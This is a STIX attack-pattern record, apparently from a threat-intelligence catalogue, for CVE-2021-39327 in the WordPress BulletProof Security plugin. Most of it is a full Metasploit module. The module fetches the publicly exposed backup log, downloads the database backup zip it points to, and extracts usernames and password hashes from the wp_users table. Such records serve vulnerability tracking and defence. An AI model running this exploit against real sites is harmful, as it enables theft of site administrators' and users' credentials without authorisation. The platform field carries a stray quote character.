{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--832f8025-bf52-457d-8f90-5f1a7747d40e",
    "created": "2024-08-14T16:30:09.83391Z",
    "modified": "2024-08-14T16:30:09.833917Z",
    "name": "Wordpress BulletProof Security Backup Disclosure",
    "description": " The Wordpress plugin BulletProof Security, versions <= 5.1, suffers from an information disclosure vulnerability, in that the db_backup_log.txt is publicly accessible.  If the backup functionality is being utilized, this file will disclose where the backup files can be downloaded. After downloading the backup file, it will be parsed to grab all user credentials. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/wp_bulletproofsecurity_backups.rb",
            "external_id": "wp_bulletproofsecurity_backups.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-39327"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/Hacker5preme/Exploits/blob/main/Wordpress/CVE-2021-39327/README.md"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/zip'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Wordpress BulletProof Security Backup Disclosure',\n        'Description' => %q{\n          The Wordpress plugin BulletProof Security, versions <= 5.1, suffers from an information disclosure\n          vulnerability, in that the db_backup_log.txt is publicly accessible.  If the backup functionality\n          is being utilized, this file will disclose where the backup files can be downloaded.\n          After downloading the backup file, it will be parsed to grab all user credentials.\n        },\n        'Author' => [\n          'Ron Jost (Hacker5preme)', # EDB module/discovery\n          'h00die' # Metasploit module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['EDB', '50382'],\n          ['CVE', '2021-39327'],\n          ['PACKETSTORM', '164420'],\n          ['URL', 'https://github.com/Hacker5preme/Exploits/blob/main/Wordpress/CVE-2021-39327/README.md']\n        ],\n        'Privileged' => false,\n        'Platform' => 'php',\n        'Arch' => ARCH_PHP,\n        'DisclosureDate' => '2021-09-17',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n    )\n  end\n\n  def parse_sqldump_fields(line)\n    # pull all fields\n    line =~ /\\((.+)\\)/\n    return nil if Regexp.last_match(1).nil?\n\n    fields = line.split(',')\n    # strip each field\n    fields.collect { |e| e ? e.strip : e }\n  end\n\n  def parse_sqldump(content, ip)\n    read_next_line = false\n    login = nil\n    hash = nil\n    content.each_line do |line|\n      if read_next_line\n        print_status(\"Found user line: #{line.strip}\")\n        fields = parse_sqldump_fields(line)\n        username = fields[login].strip[1...-1] # remove quotes\n        password = fields[hash].strip[1...-1] # remove quotes\n        print_good(\"  Extracted user content: #{username} -> #{password}\")\n        read_next_line = false\n        create_credential({\n          workspace_id: myworkspace_id,\n          origin_type: :service,\n          module_fullname: fullname,\n          username: username,\n          private_type: :nonreplayable_hash,\n          jtr_format: Metasploit::Framework::Hashes.identify_hash(password),\n          private_data: password,\n          service_name: 'Wordpress',\n          address: ip,\n          port: datastore['RPORT'],\n          protocol: 'tcp',\n          status: Metasploit::Model::Login::Status::UNTRIED\n        })\n      end\n      # INSERT INTO `wp_users` ( ID, user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_activation_key, user_status, display_name )\n      next unless line.start_with?('INSERT INTO `wp_users`')\n\n      read_next_line = true\n      # process insert statement to find the fields we want\n      next unless hash.nil?\n\n      fields = parse_sqldump_fields(line)\n      login = fields.index('user_login')\n      hash = fields.index('user_pass')\n    end\n  end\n\n  def parse_log(content, ip)\n    base = nil\n    file = nil\n    content.each_line do |line|\n      if line.include? 'DB Backup File Download Link|URL: '\n        base = line.split(': ').last\n        base = base.split('/')\n        base = base[3, base.length] # strip off anything before the URI\n        base = \"/#{base.join('/')}\".strip\n      end\n      if line.include? 'Zip Backup File Name: '\n        file = line.split(': ').last\n        file = file.split('/').last.strip\n      end\n\n      next if base.nil? || file.nil?\n\n      vprint_status(\"Pulling: #{base}#{file}\")\n      res = send_request_cgi({\n        'uri' => normalize_uri(\"#{base}#{file}\")\n      })\n      base = nil\n      next unless res && res.code == 200\n\n      p = store_loot(file, 'application/zip', rhost, res.body, file)\n      print_good(\"Stored DB Backup #{file} to #{p}, size: #{res.body.length}\")\n      Zip::File.open(p) do |zip_file|\n        zip_file.each do |inner_file|\n          is = inner_file.get_input_stream\n          sqldump = is.read\n          is.close\n          parse_sqldump(sqldump, ip)\n        end\n      end\n    end\n  end\n\n  def run_host(ip)\n    vprint_status('Checking if target is online and running Wordpress...')\n    fail_with(Failure::BadConfig, 'The target is not online and running Wordpress') unless wordpress_and_online?\n    vprint_status('Checking plugin installed and vulnerable')\n    checkcode = check_plugin_version_from_readme('bulletproof-security', '5.2')\n    fail_with(Failure::BadConfig, 'The target is not running a vulnerable bulletproof-security version') if checkcode == Exploit::CheckCode::Safe\n    print_status('Requesting Backup files')\n    ['/wp-content/bps-backup/logs/db_backup_log.txt', '/wp-content/plugins/bulletproof-security/admin/htaccess/db_backup_log.txt'].each do |url|\n      res = send_request_cgi({\n        'uri' => normalize_uri(target_uri.path, url)\n      })\n\n      # <65 in length will be just the banner, like:\n      # BPS DB BACKUP LOG\n      # ==================\n      # ==================\n      unless res && res.code == 200 && res.body.length > 65\n        print_error(\"#{url} not found on server or no data\")\n        next\n      end\n      filename = url.split('/').last\n      p = store_loot(filename, 'text/plain', rhost, res.body, filename)\n      print_good(\"Stored #{filename} to #{p}, size: #{res.body.length}\")\n      parse_log(res.body, ip)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-09-17",
    "x_mitre_platforms": [
        "php'"
    ]
}